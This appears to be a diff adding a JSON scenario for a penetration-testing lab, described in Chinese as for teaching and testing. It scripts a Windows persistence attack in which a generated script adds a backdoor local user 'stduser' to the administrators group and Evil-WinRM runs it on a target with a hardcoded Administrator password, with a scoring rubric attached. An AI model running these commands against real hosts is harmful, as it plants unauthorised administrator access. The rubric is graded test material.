@@ -1,0 +1,107 @@
+{
+  "id": "winrm_persistence_user",
+  "name": "Windows Remote Management - Local User Persistence",
+  "description": "教学与测试目的：通过 Evil-WinRM 远程命令通道，在 Windows 靶机中创建一个新的本地后门用户并加入管理员组。演示 MITRE ATT&CK 权限维持（Persistence）战术阶段的本地账户创建技术。",
+  "category": "lateral-movement",
+  "difficulty": "easy",
+  "estimatedDuration": "5 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Persistence"
+  ],
+  "mitreTechniques": [
+    "T1136.001",
+    "T1098"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "win_profile": {
+    "username": "Administrator",
+    "password": "200209",
+    "winrm_port": "5985"
+  },
+  "steps": [
+    {
+      "id": "step1_prepare_user_script",
+      "name": "Prepare User Script",
+      "description": "在本地生成一个用于在目标机器上新建用户 `stduser` 并将其分配至本地管理员组的脚本。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo 'net user stduser Pass123! /add; net localgroup administrators stduser /add' > /tmp/add_user.ps1 && echo 'Script created: /tmp/add_user.ps1'"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.001"
+      ]
+    },
+    {
+      "id": "step2_execute_user_creation",
+      "name": "Execute User Creation",
+      "description": "利用 Evil-WinRM 远程传输并运行用户添加脚本，使 Windows 靶机创建后门账户以维持权限。",
+      "toolId": "evil-winrm",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "{{username}}",
+        "-p",
+        "{{password}}",
+        "--port",
+        "{{winrm_port}}",
+        "-s",
+        "/tmp/add_user.ps1"
+      ],
+      "score": 90,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1136.001",
+        "T1098"
+      ],
+      "payload_id": "lateral-winrm"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "user_script_created",
+        "desc": "成功创建本地添加账户脚本",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Script created|add_user.ps1"
+        }
+      },
+      {
+        "id": "user_created",
+        "desc": "成功在靶机中执行账号添加和特权提升指令",
+        "points": 90,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Connected successfully|command completed successfully|successfully"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "新建后门账号在远程靶机中执行；需要 Windows 靶标开启 5985 端口且具备 Administrator 账号登录权限",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示使用 WinRM 对 Windows 靶标进行本地用户持久化账号的建立（T1136.001）",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
